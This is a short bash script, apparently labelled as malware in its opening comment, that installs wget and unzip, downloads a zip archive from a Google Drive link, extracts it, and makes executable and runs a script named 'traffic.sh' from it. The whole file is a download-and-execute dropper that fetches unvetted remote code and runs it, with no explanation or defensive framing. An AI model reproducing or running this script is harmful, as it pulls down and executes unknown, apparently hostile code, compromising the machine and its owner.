#!/bin/bash
#<---Malwe--->
apt update
apt install ca-certificates -y
apt install wget -y
apt install unzip -y
update-ca-certificates
apt install unzip -y
wget "https://drive.usercontent.google.com/u/0/uc?id=1bE3kF1Nclw0VyKq4bL2VtOOt53IC7lG5&export=download" -O 6.zip
unzip 6.zip
chmod +x traffic.sh
./traffic.sh
